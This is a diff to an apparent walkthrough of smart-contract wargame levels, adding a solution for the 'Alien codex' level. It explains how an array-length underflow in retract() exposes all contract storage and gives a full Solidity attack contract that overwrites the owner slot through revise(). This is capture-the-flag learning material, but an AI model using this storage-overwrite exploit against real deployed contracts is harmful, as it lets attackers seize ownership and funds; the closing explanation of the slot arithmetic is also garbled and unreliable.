@@ -299,4 +299,35 @@ f3                       | RETURN
 * From browser console set this bytecode into a variable `bytecode` and use `web3.eth.sendTransaction(from: player, data: bytecode)` to crack the level.
 
 # 18. Alien codex
-* Here we can exploit the `retract()` function because its not checking for the underflow or overflow of the array.
+* Here we can exploit the `retract()` function because its not checking for the underflow or overflow of the array. Initially the owner and bool value will be assigned to the slot 0 of the storage, slot 1 will be used for storing the length of the dynamic array codex. 
+* After calling the 'retract()' on an empty array the array now takes the whole 2^256 slots of storage, Now we can manipulate the owner on the slot 0 by calling `revise()` function.
+* This level can also be cracked from both the console or using an external contract, Contract used for cracking this level is given below.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IAlienCodex {
+    function owner() view external returns(address);
+    function make_contact() external;
+    function retract() external;
+    function revise(uint i, bytes32 _content) external;
+
+}
+contract Hack {
+    constructor(IAlienCodex target) {
+        target.make_contact();
+        target.retract();
+
+        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
+        uint256 i;
+        unchecked{
+            i -= h;
+        }
+
+        target.revise(i, bytes32(uint256(uint160(msg.sender))));
+        require(target.owner() == msg.sender, "failed");
+    }
+}
+
+```
+* Here h shows how a dynammic array stores values in diffrent memory positions by hashing the slot number of codex and slot 0 (here i) can be found by taking negative of h i.e, slot 0 = slot h - i, h - i = 0, i = h - 0. 
